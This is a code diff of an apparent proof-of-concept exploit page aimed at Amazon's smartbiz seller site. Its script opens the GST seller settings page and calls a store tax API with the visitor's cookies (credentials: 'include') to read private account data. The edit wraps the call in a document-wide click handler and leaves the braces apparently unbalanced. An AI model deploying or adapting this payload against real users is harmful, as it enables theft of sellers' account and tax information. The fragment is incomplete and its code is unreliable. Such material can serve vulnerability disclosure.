@@ -6,7 +6,8 @@
     <button id="poc">req</button>
     <script>
       document.getElementById('poc').addEventListener('click', function() {
-        const win = window.open("https://smartbiz.amazon.in/settings/gst-seller");
+        document.onclick = () => {
+        open('https://smartbiz.amazon.in/settings/gst-seller')
         const url = "https://smartbiz.amazon.in/api/stores/66307/tax";
         fetch(url, { credentials: "include" }) 
           .then(r => r.json())
